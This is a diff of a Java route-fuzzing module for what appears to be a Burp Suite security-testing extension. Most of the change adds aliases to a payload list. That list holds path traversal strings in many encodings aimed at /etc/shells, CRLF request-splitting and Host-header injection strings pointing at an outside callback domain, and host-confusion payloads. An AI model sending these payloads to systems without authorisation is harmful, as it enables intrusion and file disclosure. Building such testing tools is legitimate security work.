@@ -1,10 +1,8 @@
 package pzfzr.fuzzer;
-
 import java.util.*;
 import java.util.concurrent.atomic.AtomicInteger;
 import java.net.URLEncoder;
 import java.io.UnsupportedEncodingException;
-
 import burp.api.montoya.http.message.HttpRequestResponse;
 import burp.api.montoya.http.message.requests.HttpRequest;
 import burp.api.montoya.http.message.HttpHeader;
@@ -22,66 +20,64 @@ public class RouteFuzzer {
     private final MontoyaApi api;
     private final TableModel tableModel;
     private volatile boolean isShuttingDown = false;
-
     private static final ThreadLocal<Random> RANDOM = ThreadLocal.withInitial(Random::new);
     private static final String HASH_CHARS = "0123456789abcdefghijklmnopqrstuvwxyz";
     private static final int HASH_LENGTH = 5;
-
     private final RequestResponseSaver requestResponseSaver;
     private final Logging logging;
     private final RateLimiter rateLimiter;
     private final CookieChanger cookieChanger;
     private final RequestDeduplicator requestDeduplicator;
 
-    // 替换用的payloads列表
-    private static final List<String> PAYLOADS = Arrays.asList(
-            "norandomx",
-            "/{path}",
-            "%2f{path}",
-            "./{path}",
-            "%2e%2f{path}",
-            "{path}/../{path}",
-            "{path}%2f..%2f{path}",
-            "{param}&norandom=xx",
-            "{param}%26norandom=xx",
-            "{path}/",
-            "{path}%2f",
-            "{path_url_encoded}",
-            "{path_double_url_encoded}",
-            "{path}#",
-            "{path}%23",
-            "{path}?",
-            "{path}%3f",
-            "{path}/../../../../../../../",
-            "{path}%2f..%2f..%2f..%2f..%2f..%2f..%2f..",
-            "{path}\\",
-            "{path}\\..\\..\\",
-            "{path}%5c..%5c..%5c",
-            "{path}%20HTTP/1.1%0D%0AHost:%20{fuzz}.abga5.wi11.fun%0D%0Ax2x:%20",
-            "file:///etc/shells",
-            "{path}/%20H",
-            "{path}/%20HTTP/19.91%0D%0AX:%20x",
-            "{path}/%20HTTP/1.1%0D%0AHost:%20{fuzz}.abga5.wi11.fun%0D%0Ax2x:",
-            "{path1}{path2}",
-            "{path}..",
-            "{path}@{fuzz}.abga5.wi11.fun",
-            "{path}/..;/..;/..;/..;/..;",
-            "{path}/..;",
-            "{path}/..%2f..%2f..%2f..%2f..",
-            "{path}/..%2f",
-            "{path}/..%5c..%5c..%5c..%5c..",
-            "{path}/..%5c",
-            "{path}/",
-            "{path}/norandomx",
-            "{path}/..//..//..//..//..//..//..//..//..//etc//shells",
-            "{path}/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshells",
-            "{path}/../../../../../../../../etc/shells",
-            "{path}/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/shells",
-            "{path}/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/shells",
-            "{path}/\\..\\..\\...\\..\\..\\..\\..\\..\\..\\etc\\shells",
-            "{path}/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/shells",
-            "{path}/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2F%2E%2F%2F%2E%2F%2F%2E%2F%2Fetc%2Fshells"
-    );
+    // payload与别名的映射数组 [payload, alias]
+    private static final String[][] PAYLOAD_DATA = {
+            {"norandomx", "payload01"},
+            {"/{path}", "payload02"},
+            {"%2f{path}", "payload03"},
+            {"./{path}", "payload04"},
+            {"%2e%2f{path}", "payload05"},
+            {"{path}/../{path}", "payload06"},
+            {"{path}%2f..%2f{path}", "payload07"},
+            {"{param}&norandom=xx", "payload08"},
+            {"{param}%26norandom=xx", "payload09"},
+            {"{path}/", "payload10"},
+            {"{path}%2f", "payload11"},
+            {"{path_url_encoded}", "payload12"},
+            {"{path_double_url_encoded}", "payload13"},
+            {"{path}#", "payload14"},
+            {"{path}%23", "payload15"},
+            {"{path}?", "payload16"},
+            {"{path}%3f", "payload17"},
+            {"{path}/../../../../../../../", "payload18"},
+            {"{path}%2f..%2f..%2f..%2f..%2f..%2f..%2f..", "payload19"},
+            {"{path}\\", "payload20"},
+            {"{path}\\..\\..\\", "payload21"},
+            {"{path}%5c..%5c..%5c", "payload22"},
+            {"{path}%20HTTP/1.1%0D%0AHost:%20{fuzz}.abga5.wi11.fun%0D%0Ax2x:%20", "payload23"},
+            {"file:///etc/shells", "payload24"},
+            {"{path}/%20H", "payload25"},
+            {"{path}/%20HTTP/19.91%0D%0AX:%20x", "payload26"},
+            {"{path}/%20HTTP/1.1%0D%0AHost:%20{fuzz}.abga5.wi11.fun%0D%0Ax2x:", "payload27"},
+            {"{path1}{path2}", "payload28"},
+            {"{path}..", "payload29"},
+            {"{path}@{fuzz}.abga5.wi11.fun", "payload30"},
+            {"{path}/..;/..;/..;/..;/..;", "payload31"},
+            {"{path}/..;", "payload32"},
+            {"{path}/..%2f..%2f..%2f..%2f..", "payload33"},
+            {"{path}/..%2f", "payload34"},
+            {"{path}/..%5c..%5c..%5c..%5c..", "payload35"},
+            {"{path}/..%5c", "payload36"},
+            {"{path}/", "payload37"},
+            {"{path}/norandomx", "payload38"},
+            {"{path}/..//..//..//..//..//..//..//..//..//etc//shells", "payload39"},
+            {"{path}/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshells", "payload40"},
+            {"{path}/../../../../../../../../etc/shells", "payload41"},
+            {"{path}/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/shells", "payload42"},
+            {"{path}/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/shells", "payload43"},
+            {"{path}/\\..\\..\\...\\..\\..\\..\\..\\..\\..\\etc\\shells", "payload44"},
+            {"{path}/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/shells", "payload45"},
+            {"{path}/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2F%2E%2F%2F%2E%2F%2F%2E%2F%2Fetc%2Fshells", "payload46"}
+    };
 
     public RouteFuzzer(MontoyaApi api, TableModel tableModel, RequestResponseSaver requestResponseSaver,
                        RateLimiter rateLimiter, AtomicInteger nextModifiedId) {
@@ -105,35 +101,28 @@ public class RouteFuzzer {
         if (isShuttingDown) {
             return;
         }
-
         try {
             String path = originalRequest.pathWithoutQuery();
             if (path == null || path.isEmpty() || path.equals("/")) {
                 return; // 跳过根路径或空路径
             }
-
             // 处理结尾斜杠的情况
             boolean hasTrailingSlash = path.endsWith("/");
             String normalizedPath = hasTrailingSlash ? path.substring(0, path.length() - 1) : path;
-
             // 分割路径段
             List<String> pathSegments = parsePathSegments(normalizedPath);
             if (pathSegments.isEmpty()) {
                 return;
             }
-
             // 从完整路径开始，逐级减少测试
             for (int level = pathSegments.size(); level >= 1; level--) {
                 if (isShuttingDown) {
                     return;
                 }
-
                 List<String> currentSegments = pathSegments.subList(0, level);
                 boolean shouldTestTrailingSlash = hasTrailingSlash && level == pathSegments.size();
-
                 testPathLevelWithDeduplication(originalRequest, messageId, host, currentSegments, shouldTestTrailingSlash);
             }
-
         } catch (Exception e) {
             // 错误处理
         }
@@ -149,32 +138,25 @@ public class RouteFuzzer {
         if (isShuttingDown) {
             return;
         }
-
         try {
             String path = originalRequest.pathWithoutQuery();
             if (path == null || path.isEmpty() || path.equals("/")) {
                 return;
             }
-
             boolean hasTrailingSlash = path.endsWith("/");
             String normalizedPath = hasTrailingSlash ? path.substring(0, path.length() - 1) : path;
-
             List<String> pathSegments = parsePathSegments(normalizedPath);
             if (pathSegments.isEmpty()) {
                 return;
             }
-
             for (int level = pathSegments.size(); level >= 1; level--) {
                 if (isShuttingDown) {
                     return;
                 }
-
                 List<String> currentSegments = pathSegments.subList(0, level);
                 boolean shouldTestTrailingSlash = hasTrailingSlash && level == pathSegments.size();
-
                 testPathLevelWithoutDeduplication(originalRequest, messageId, host, currentSegments, shouldTestTrailingSlash);
             }
-
         } catch (Exception e) {
             // 错误处理
         }
@@ -204,20 +186,23 @@ public class RouteFuzzer {
             if (isShuttingDown) {
                 return;
             }
-
             // 对当前段测试每个payload
-            for (String payload : PAYLOADS) {
+            for (int payloadIndex = 0; payloadIndex < PAYLOAD_DATA.length; payloadIndex++) {
                 if (isShuttingDown) {
                     return;
                 }
-
                 try {
-                    // 测试不带尾部斜杠的版本
-                    testSinglePayload(originalRequest, messageId, host, pathSegments, segmentIndex, payload, false, true);
+                    String payload = PAYLOAD_DATA[payloadIndex][0];
+                    String payloadAlias = PAYLOAD_DATA[payloadIndex][1];
+                    String currentTestParam = pathSegments.get(segmentIndex);
 
+                    // 测试不带尾部斜杠的版本
+                    testSinglePayload(originalRequest, messageId, host, pathSegments, segmentIndex, payload,
+                            payloadAlias, currentTestParam, false, true);
                     // 如果原始路径有尾部斜杠，且当前是最后一个段，也测试带斜杠的版本
                     if (testTrailingSlash && segmentIndex == pathSegments.size() - 1) {
-                        testSinglePayload(originalRequest, messageId, host, pathSegments, segmentIndex, payload, true, true);
+                        testSinglePayload(originalRequest, messageId, host, pathSegments, segmentIndex, payload,
+                                payloadAlias, currentTestParam, true, true);
                     }
                 } catch (Exception e) {
                     // 错误处理
@@ -235,17 +220,20 @@ public class RouteFuzzer {
             if (isShuttingDown) {
                 return;
             }
-
-            for (String payload : PAYLOADS) {
+            for (int payloadIndex = 0; payloadIndex < PAYLOAD_DATA.length; payloadIndex++) {
                 if (isShuttingDown) {
                     return;
                 }
-
                 try {
-                    testSinglePayload(originalRequest, messageId, host, pathSegments, segmentIndex, payload, false, false);
+                    String payload = PAYLOAD_DATA[payloadIndex][0];
+                    String payloadAlias = PAYLOAD_DATA[payloadIndex][1];
+                    String currentTestParam = pathSegments.get(segmentIndex);
 
+                    testSinglePayload(originalRequest, messageId, host, pathSegments, segmentIndex, payload,
+                            payloadAlias, currentTestParam, false, false);
                     if (testTrailingSlash && segmentIndex == pathSegments.size() - 1) {
-                        testSinglePayload(originalRequest, messageId, host, pathSegments, segmentIndex, payload, true, false);
+                        testSinglePayload(originalRequest, messageId, host, pathSegments, segmentIndex, payload,
+                                payloadAlias, currentTestParam, true, false);
                     }
                 } catch (Exception e) {
                     // 错误处理
@@ -259,16 +247,17 @@ public class RouteFuzzer {
      */
     private void testSinglePayload(HttpRequest originalRequest, int messageId, String host,
                                    List<String> pathSegments, int targetIndex, String payload,
+                                   String payloadAlias, String currentTestParam,
                                    boolean addTrailingSlash, boolean useDeduplication) {
         String modifiedPath = generateModifiedPath(pathSegments, targetIndex, payload, addTrailingSlash);
         if (modifiedPath != null) {
             if (useDeduplication) {
                 String fullUrl = host + modifiedPath;
                 if (!requestDeduplicator.shouldSkipRequest(originalRequest.method(), fullUrl, "RouteFuzzer")) {
-                    sendTestRequest(originalRequest, messageId, host, modifiedPath);
+                    sendTestRequest(originalRequest, messageId, host, modifiedPath, payloadAlias, currentTestParam);
                 }
             } else {
-                sendTestRequest(originalRequest, messageId, host, modifiedPath);
+                sendTestRequest(originalRequest, messageId, host, modifiedPath, payloadAlias, currentTestParam);
             }
         }
     }
@@ -278,9 +267,7 @@ public class RouteFuzzer {
      */
     private String generateModifiedPath(List<String> pathSegments, int targetIndex, String payload, boolean addTrailingSlash) {
         List<String> modifiedSegments = new ArrayList<>(pathSegments);
-
         String modifiedPayload = payload;
-
         // 处理 {fuzz} 替换
         if (modifiedPayload.contains("{fuzz}")) {
             char[] hash = new char[HASH_LENGTH];
@@ -289,12 +276,10 @@ public class RouteFuzzer {
             }
             modifiedPayload = modifiedPayload.replace("{fuzz}", new String(hash));
         }
-
         // 处理特殊情况 {path1}{path2}
         if (modifiedPayload.contains("{path1}{path2}")) {
             return handlePath1Path2Payload(modifiedSegments, targetIndex, addTrailingSlash);
         }
-
         // 处理URL编码的特殊情况
         if (modifiedPayload.equals("{path_url_encoded}")) {
             String targetSegment = modifiedSegments.get(targetIndex);
@@ -310,16 +295,13 @@ public class RouteFuzzer {
                 String targetSegment = modifiedSegments.get(targetIndex);
                 modifiedPayload = modifiedPayload.replace("{path}", targetSegment);
             }
-
             // 处理 {param} 替换 (这里假设用路径段替换)
             if (modifiedPayload.contains("{param}")) {
                 String targetSegment = modifiedSegments.get(targetIndex);
                 modifiedPayload = modifiedPayload.replace("{param}", targetSegment);
             }
-
             modifiedSegments.set(targetIndex, modifiedPayload);
         }
-
         // 构建最终路径
         return buildPath(modifiedSegments, addTrailingSlash);
     }
@@ -331,7 +313,6 @@ public class RouteFuzzer {
         if (input == null || input.isEmpty()) {
             return input;
         }
-
         StringBuilder encoded = new StringBuilder();
         byte[] bytes;
         try {
@@ -339,11 +320,9 @@ public class RouteFuzzer {
         } catch (UnsupportedEncodingException e) {
             bytes = input.getBytes();
         }
-
         for (byte b : bytes) {
             encoded.append(String.format("%%%02x", b & 0xFF));
         }
-
         return encoded.toString();
     }
 
@@ -352,12 +331,10 @@ public class RouteFuzzer {
      */
     private String handlePath1Path2Payload(List<String> pathSegments, int targetIndex, boolean addTrailingSlash) {
         List<String> modifiedSegments = new ArrayList<>(pathSegments);
-
         // 根据需求，{path1}{path2} 有几种变体：
         // 1. 当前段 + 下一段 (如果存在下一段)
         // 2. 上一段 + 当前段 (如果存在上一段)
         // 3. 其他组合
-
         if (targetIndex < modifiedSegments.size() - 1) {
             // 变体1：当前段与下一段组合
             String path1 = modifiedSegments.get(targetIndex);
@@ -374,7 +351,6 @@ public class RouteFuzzer {
             // 只有一个段，无法应用 {path1}{path2}
             return null;
         }
-
         return buildPath(modifiedSegments, addTrailingSlash);
     }
 
@@ -386,51 +362,46 @@ public class RouteFuzzer {
         for (String segment : segments) {
             pathBuilder.append("/").append(segment);
         }
-
         if (addTrailingSlash) {
             pathBuilder.append("/");
         }
-
         return pathBuilder.toString();
     }
 
     /**
      * 发送测试请求
      */
-    private void sendTestRequest(HttpRequest originalRequest, int messageId, String host, String modifiedPath) {
+    private void sendTestRequest(HttpRequest originalRequest, int messageId, String host, String modifiedPath,
+                                 String payloadAlias, String currentTestParam) {
         try {
             // 创建修改后的请求
             HttpRequest modifiedRequest = originalRequest.withPath(modifiedPath);
-
             // 获取并添加认证相关的header
             List<HttpHeader> authHeaders = cookieChanger.getHttpHeadersForHost(host);
             if (authHeaders != null && !authHeaders.isEmpty()) {
                 modifiedRequest = modifiedRequest.withUpdatedHeaders(authHeaders);
             }
-
             rateLimiter.acquire(modifiedRequest.url() + modifiedRequest.method());
-
             // 发送修改后的请求
             HttpRequestResponse modifiedResponse = api.http().sendRequest(modifiedRequest);
             int tempID = nextModifiedId.getAndIncrement();
-
-            // 保存修改后的请求和响应
+            // 保存修改后的请求和响应，传入新的参数
             ModifiedRequestResponse modifiedPair = new ModifiedRequestResponse(
                     tempID,
                     messageId,
                     "ROUTE",
                     "",
+                    payloadAlias,       // payload别名
+                    currentTestParam,    // 当前测试参数的名称（被替换的path片段）
                     requestResponseSaver,
                     logging
             );
             tableModel.addModifiedEntry(modifiedPair);
             requestResponseSaver.saveModifiedRequest(modifiedRequest, tempID);
             requestResponseSaver.handleDelayedModifiedResponse(modifiedResponse, tempID);
-
             // 清理引用
             modifiedRequest = null;
             modifiedResponse = null;
-
         } catch (Exception e) {
             // 错误处理
         }
